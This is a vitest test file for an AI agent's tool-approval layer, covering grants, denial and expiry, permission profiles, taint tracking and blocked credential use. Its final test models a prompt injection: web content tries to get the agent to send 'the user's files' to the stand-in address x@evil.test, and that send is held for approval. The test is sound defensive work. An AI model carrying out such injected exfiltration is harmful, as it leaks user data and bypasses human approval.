import { afterEach, describe, expect, it, vi } from "vitest";
import {
  approve,
  askApproval,
  assistantTexts,
  decide,
  effects,
  grants,
  pending,
  sayAndSettle,
  send,
  sessionOf,
  setProfile,
  todo,
  tool,
  waitPending,
} from "./helpers/approvals.ts";
import { startSignedIn, type TestServer } from "./helpers/server.ts";
import { chat, detail, settled } from "./helpers/sessions.ts";

let server: (TestServer & { totpSecret: string }) | undefined;
afterEach(async () => {
  await server?.destroy();
  server = undefined;
});
const store = () => server!.host.plane.store;
const HOUR = 3_600_000;

describe("grants", () => {
  it("a session grant lets later calls of the same operation run in that session, and only there", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    const b = await chat(server);
    await setProfile(server, a, "strict");
    await setProfile(server, b, "strict");
    await askApproval(server, a, todo("milk"));
    const approved = await approve(server, a, { length: "session" });
    expect(approved.grantLength).toBe("session");
    expect(effects(server)).toHaveLength(1);
    expect(await grants(server)).toMatchObject([
      {
        connector: "demo",
        operation: "todo.add",
        destination: null,
        length: "session",
        sessionId: a,
        agentId: null,
        expiresAt: null,
        approvalId: approved.id,
      },
    ]);

    // A different argument, same operation: no new approval.
    const d = await sayAndSettle(server, a, todo("bread"));
    expect(effects(server).map((e) => e.args)).toEqual([{ text: "milk" }, { text: "bread" }]);
    expect(await pending(server)).toEqual([]);
    expect(assistantTexts(d).at(-1)).toContain("Done.");

    // Another session does not get it.
    await askApproval(server, b, todo("eggs"));
    expect(effects(server)).toHaveLength(2);
    expect(await pending(server)).toHaveLength(1);
  });

  it("an agent grant covers every session of that agent", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    const b = await chat(server);
    await setProfile(server, a, "strict");
    await setProfile(server, b, "strict");
    await askApproval(server, a, todo("milk"));
    await approve(server, a, { length: "agent" });
    const g = (await grants(server))[0]!;
    expect(g).toMatchObject({ length: "agent", sessionId: null, agentId: (await sessionOf(server, a)).agentId });
    await sayAndSettle(server, b, todo("eggs"));
    expect(effects(server)).toHaveLength(2);
    expect(await pending(server)).toEqual([]);
  });

  it("an hours grant runs calls until it ends, records grantExpiresAt, and then asks again", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    await setProfile(server, a, "strict");
    await askApproval(server, a, todo("milk"));
    const baseNow = server.clock.now();
    let ticks = 0;
    const clock = vi.spyOn(server.clock, "now").mockImplementation(() => baseNow + ticks++);
    let approved: Awaited<ReturnType<typeof approve>>;
    try {
      approved = await approve(server, a, { length: "hours", hours: 2 });
    } finally {
      clock.mockRestore();
    }
    expect(approved.grantLength).toBe("hours");
    expect(approved.grantExpiresAt).toBe(approved.decidedAt! + 2 * HOUR);
    const [g] = await grants(server);
    expect(g).toMatchObject({ length: "hours", expiresAt: approved.grantExpiresAt });

    server.clock.advance(HOUR);
    await sayAndSettle(server, a, todo("bread"));
    expect(effects(server)).toHaveLength(2);

    server.clock.advance(2 * HOUR);
    expect(await grants(server)).toEqual([]);
    await askApproval(server, a, todo("eggs"));
    expect(effects(server)).toHaveLength(2);
    expect(await pending(server)).toHaveLength(1);
  });

  it("an always grant keeps working; revoking it (logged, row kept) makes the next call ask again", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    await setProfile(server, a, "strict");
    await askApproval(server, a, todo("milk"));
    const approved = await approve(server, a, { length: "always" });
    const [g] = await grants(server);
    expect(g).toMatchObject({ length: "always", sessionId: null, agentId: null, expiresAt: null });
    await sayAndSettle(server, a, todo("bread"));
    expect(effects(server)).toHaveLength(2);

    const res = await server.client.call("DELETE", `/api/grants/${g!.id}`);
    expect(res.status).toBe(200);
    expect(await grants(server)).toEqual([]);
    expect(
      store().db.get<{ revoked_at: number | null }>("SELECT revoked_at FROM grants WHERE id = ?", g!.id)!.revoked_at,
    ).not.toBeNull();
    const text = server.logs.join("\n");
    expect(text).toContain("grant.created");
    expect(text).toContain("grant.revoked");
    expect(text).toContain(approved.id);

    await askApproval(server, a, todo("eggs"));
    expect(effects(server)).toHaveLength(2);
    expect(await pending(server)).toHaveLength(1);
    // Revoking twice: it is no longer in force.
    expect((await server.client.call("DELETE", `/api/grants/${g!.id}`)).status).toBe(404);
  });

  it("a grant names the destination: sending to one address does not cover another", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    await askApproval(server, a, send("ana@example.test"));
    await approve(server, a, { length: "session" });
    expect(await grants(server)).toMatchObject([
      { connector: "demo", operation: "message.send", destination: "ana@example.test" },
    ]);
    await sayAndSettle(server, a, send("ana@example.test", "again"));
    expect(effects(server)).toHaveLength(2);
    await askApproval(server, a, send("bob@example.test"));
    expect(effects(server)).toHaveLength(2);
    expect(await pending(server)).toMatchObject([{ destination: "bob@example.test" }]);
  });

  it("an approval can only choose a length it offers; hours must be 1 to 168", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    await askApproval(server, a, tool("demo_buy", { item: "book", price: 12 }));
    const [buy] = await pending(server);
    expect(buy!.lengths).toEqual(["once"]);
    const bad = await decide(server, buy!.id, { decision: "approve", length: "always" });
    expect(bad.status).toBe(400);
    expect(bad.body.error.code).toBe("bad_length");
    expect(await pending(server)).toHaveLength(1);
    expect(effects(server)).toHaveLength(0);

    const b = await chat(server);
    await setProfile(server, b, "strict");
    await askApproval(server, b, todo("milk"));
    const [t] = (await pending(server)).filter((x) => x.sessionId === b);
    for (const hours of [0, 169, 1.5, -1]) {
      const r = await decide(server, t!.id, { decision: "approve", length: "hours", hours });
      expect(r.status, `hours ${hours}`).toBe(400);
      expect(r.body.error.code).toBe("bad_hours");
    }
    const noHours = await decide(server, t!.id, { decision: "approve", length: "hours" });
    expect(noHours.body.error.code).toBe("bad_hours");
    const ok = await decide(server, t!.id, { decision: "approve", length: "hours", hours: 168 });
    expect(ok.status).toBe(200);
    await settled(server, b, 1);
  });
});

describe("deny and expiry", () => {
  it("a denial runs nothing and tells the agent in the original run, and updates the cards", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    await setProfile(server, a, "strict");
    await askApproval(server, a, todo("milk"));
    const [ap] = await pending(server);
    const res = await decide(server, ap!.id, { decision: "deny" });
    expect(res.status).toBe(200);
    expect(res.body.approval.status).toBe("denied");
    const d = await settled(server, a);
    expect(effects(server)).toHaveLength(0);
    expect(d.runs).toHaveLength(1);
    expect(d.session.status).toBe("idle");
    expect(d.session.pendingApprovals).toBe(0);
    expect(d.messages.find((m) => m.role === "approval")!.approval!.status).toBe("denied");
    expect(await pending(server)).toEqual([]);
    expect(
      store().db.get<{ notified_at: number | null }>("SELECT notified_at FROM approvals WHERE id = ?", ap!.id)!
        .notified_at,
    ).not.toBeNull();

    // The agent knows on its next turn.
    await sayAndSettle(server, a, "what happened?");
    const sent = (await import("./helpers/sessions.ts")).stepPayloads(server, a).join("\n");
    expect(sent).toContain("denied");
    expect(sent).toContain("This call did not run");
    expect(effects(server)).toHaveLength(0);
    // Deciding again is refused.
    const again = await decide(server, ap!.id, { decision: "approve" });
    expect(again.status).toBe(409);
    expect(again.body.error.code).toBe("not_pending");
  });

  it("an approval nobody decides expires: status expired, no effect, the agent is told, and a late approve is refused", async () => {
    server = await startSignedIn({ config: { approvalTtlMs: 600 } });
    const a = await chat(server);
    await setProfile(server, a, "strict");
    await askApproval(server, a, todo("milk"));
    const [ap] = await pending(server);
    expect(ap!.expiresAt - ap!.createdAt).toBe(600);
    await new Promise((r) => setTimeout(r, 900));
    expect(await pending(server)).toEqual([]);
    const d = await detail(server, a);
    expect(d.messages.find((m) => m.role === "approval")!.approval!.status).toBe("expired");
    expect(d.session.status).toBe("idle");
    expect(d.session.pendingApprovals).toBe(0);
    expect(effects(server)).toHaveLength(0);
    expect(server.logs.join("\n")).toContain("approval.expired");
    const late = await decide(server, ap!.id, { decision: "approve" });
    expect(late.status).toBe(409);
    expect(late.body.error.code).toBe("not_pending");
    expect(effects(server)).toHaveLength(0);
    await sayAndSettle(server, a, "anything new?");
    expect((await import("./helpers/sessions.ts")).stepPayloads(server, a).join("\n")).toContain("was expired");
  });
});

describe("profiles", () => {
  it("every new chat starts with the agent's default profile (standard)", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    expect((await sessionOf(server, a)).profile).toBe("standard");
  });

  it("changing the profile adds a notice and changes what is decided; the same profile twice adds nothing", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    await setProfile(server, a, "strict");
    await askApproval(server, a, todo("milk"));
    expect(await pending(server)).toHaveLength(1);

    const res = await setProfile(server, a, "relaxed");
    expect(res.status).toBe(200);
    expect(res.body.session.profile).toBe("standard");
    const notices = (await detail(server, a)).messages.filter((m) => m.role === "notice");
    expect(notices.map((n) => n.text)).toEqual(["Permissions changed to Strict.", "Permissions changed to Standard."]);
    await setProfile(server, a, "relaxed");
    expect((await detail(server, a)).messages.filter((m) => m.role === "notice")).toHaveLength(2);

    const [pendingTodo] = await waitPending(server, a);
    await decide(server, pendingTodo!.id, { decision: "deny" });
    await sayAndSettle(server, a, todo("bread"));
    expect(effects(server).map((e) => e.args)).toEqual([{ text: "bread" }]);

    await setProfile(server, a, "strict");
    expect((await detail(server, a)).messages.filter((m) => m.role === "notice").at(-1)!.text).toBe(
      "Permissions changed to Strict.",
    );
    await askApproval(server, a, tool("demo_read_web", { url: "https://example.test" }));
    expect((await pending(server)).filter((x) => x.sessionId === a).map((x) => x.tool)).toContain("demo_read_web");
    await setProfile(server, a, "yolo");
    expect((await detail(server, a)).messages.filter((m) => m.role === "notice").at(-1)!.text).toBe(
      "Permissions changed to YOLO.",
    );
  });

  it("rejects an unknown profile and an unknown session", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    const bad = await server.client.call("PATCH", `/api/sessions/${a}`, { body: { profile: "wild" } });
    expect(bad.status).toBe(400);
    expect(bad.body.error.code).toBe("bad_profile");
    expect((await server.client.call("PATCH", "/api/sessions/nope", { body: { profile: "strict" } })).status).toBe(404);
    expect((await sessionOf(server, a)).profile).toBe("standard");
  });

  it("renames and pins sessions through PATCH, and rejects invalid names", async () => {
    server = await startSignedIn();
    const id = await chat(server);
    const updated = await server.client.call("PATCH", `/api/sessions/${id}`, {
      body: { title: "  Travel   plans  ", pinned: true },
    });
    expect(updated.status).toBe(200);
    expect(updated.body.session).toMatchObject({ id, title: "Travel plans", pinned: true });
    expect((await sessionOf(server, id)).pinned).toBe(true);

    const invalid = await server.client.call("PATCH", `/api/sessions/${id}`, { body: { title: "   " } });
    expect(invalid.status).toBe(400);
    expect(invalid.body.error.code).toBe("bad_title");
    const invalidPin = await server.client.call("PATCH", `/api/sessions/${id}`, {
      body: { title: "Must not be saved", pinned: "yes" },
    });
    expect(invalidPin.status).toBe(400);
    expect(invalidPin.body.error.code).toBe("bad_pinned");
    const tooLong = await server.client.call("PATCH", `/api/sessions/${id}`, { body: { title: "x".repeat(81) } });
    expect(tooLong.status).toBe(400);
    expect((await sessionOf(server, id)).title).toBe("Travel plans");
  });

  it("irreversible actions ask once in Standard and run automatically in YOLO", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    await askApproval(server, a, tool("demo_buy", { item: "book", price: 12 }));
    const [ap] = await pending(server);
    expect(ap).toMatchObject({ actionClass: "irreversible", lengths: ["once"], destination: "book" });
    await approve(server, a);
    expect(effects(server)).toHaveLength(1);
    await setProfile(server, a, "yolo");
    await sayAndSettle(server, a, tool("demo_buy", { item: "book", price: 12 }));
    expect(await pending(server)).toEqual([]);
    expect(effects(server)).toHaveLength(2);
    expect(await grants(server)).toEqual([]);
  });

  it("credentials are denied with a takeover message, in every profile, and nothing is asked", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    for (const profile of ["strict", "yolo"] as const) {
      await setProfile(server, a, profile);
      await sayAndSettle(server, a, tool("demo_login", { site: "bank.example.test" }));
    }
    expect(await pending(server)).toEqual([]);
    expect(effects(server)).toHaveLength(0);
    expect(store().db.get<{ n: number }>("SELECT COUNT(*) AS n FROM approvals")!.n).toBe(0);
    const payloads = (await import("./helpers/sessions.ts")).stepPayloads(server, a).join("\n");
    expect(payloads).toMatch(/takeover/i);
  });

  it("reading outside content in strict asks first; in standard it just runs and taints the session", async () => {
    server = await startSignedIn();
    const strict = await chat(server);
    await setProfile(server, strict, "strict");
    await askApproval(server, strict, tool("demo_read_web", { url: "https://example.test" }));
    const [ap] = await waitPending(server, strict);
    expect(ap!.lengths).toEqual(["once", "session", "agent", "hours", "always"]);
    expect((await sessionOf(server, strict)).taint).toEqual([]);
    await approve(server, strict);
    expect((await sessionOf(server, strict)).taint).toEqual(["external"]);
    expect(effects(server)).toHaveLength(1);

    const std = await chat(server);
    await sayAndSettle(server, std, tool("demo_read_web", { url: "https://example.test" }));
    expect((await sessionOf(server, std)).taint).toEqual(["external"]);
    expect(effects(server)).toHaveLength(2);
    expect(await pending(server)).toEqual([]);
  });
});

describe("taint", () => {
  const readBoth = () => `${tool("demo_read_web", { url: "https://example.test" })} ${tool("demo_read_inbox", {})}`;

  it("once a session has read outside content and private data, sending asks every time in standard, and grants do not apply", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    // A send grant earned before the session became tainted.
    await askApproval(server, a, send("ana@example.test"));
    await approve(server, a, { length: "session" });
    await sayAndSettle(server, a, send("ana@example.test", "second"));
    expect(effects(server)).toHaveLength(2);

    await sayAndSettle(server, a, readBoth());
    expect((await sessionOf(server, a)).taint.sort()).toEqual(["external", "private"]);
    await askApproval(server, a, send("ana@example.test", "third"));
    const [ap] = await waitPending(server, a);
    expect(ap!.lengths).toEqual(["once"]);
    expect(ap!.taint.sort()).toEqual(["external", "private"]);
    const before = effects(server).length;
    await approve(server, a);
    expect(effects(server)).toHaveLength(before + 1);
    // Every time: the same destination asks again.
    await askApproval(server, a, send("ana@example.test", "fourth"));
    expect(await waitPending(server, a)).toHaveLength(1);
    expect(effects(server)).toHaveLength(before + 1);
  });

  it("a saved Relaxed chat uses Standard permissions", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    store().db.run("UPDATE sessions SET profile = 'relaxed' WHERE id = ?", a);
    expect((await sessionOf(server, a)).profile).toBe("standard");
    await askApproval(server, a, send("ana@example.test"));
    await approve(server, a);
    await sayAndSettle(server, a, readBoth());
    expect((await sessionOf(server, a)).taint.sort()).toEqual(["external", "private"]);
    await askApproval(server, a, send("ana@example.test", "again"));
    const [ap] = await waitPending(server, a);
    expect(ap).toMatchObject({ destination: "ana@example.test", lengths: ["once"] });
  });

  it("in yolo, a tainted session sends freely", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    await setProfile(server, a, "yolo");
    await sayAndSettle(server, a, readBoth());
    await sayAndSettle(server, a, send("anyone@example.test"));
    expect(effects(server).filter((e) => e.tool === "demo_send_message")).toHaveLength(1);
    expect(await pending(server)).toEqual([]);
  });

  it("a fork copies the profile and the taint", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    await setProfile(server, a, "yolo");
    const d = await sayAndSettle(server, a, readBoth());
    const reply = d.messages.filter((m) => m.role === "assistant").at(-1)!;
    const res = await server.client.post(`/api/sessions/${a}/fork`, { messageId: reply.id });
    expect(res.status).toBe(200);
    const fork = await sessionOf(server, res.body.session.id);
    expect(fork.profile).toBe("yolo");
    expect(fork.taint.sort()).toEqual(["external", "private"]);
    await setProfile(server, fork.id, "strict");
    await askApproval(server, fork.id, todo("milk"));
    expect(await waitPending(server, fork.id)).toHaveLength(1);
    expect(effects(server).filter((e) => e.tool === "demo_add_todo")).toHaveLength(0);
  });
});

describe("prompt injection", () => {
  it("web content with an injected instruction cannot send anything: the send still needs the user", async () => {
    server = await startSignedIn();
    const a = await chat(server);
    // The faux model does what the user typed; the page content is only data in a tool result.
    await sayAndSettle(server, a, tool("demo_read_web", { url: "https://example.test" }));
    expect(effects(server).map((e) => e.tool)).toEqual(["demo_read_web"]);
    expect(effects(server).some((e) => e.tool === "demo_send_message")).toBe(false);
    await askApproval(server, a, send("x@evil.test", "the user's files"));
    expect(effects(server).some((e) => e.tool === "demo_send_message")).toBe(false);
    expect(await pending(server)).toMatchObject([{ tool: "demo_send_message", destination: "x@evil.test" }]);
  });
});
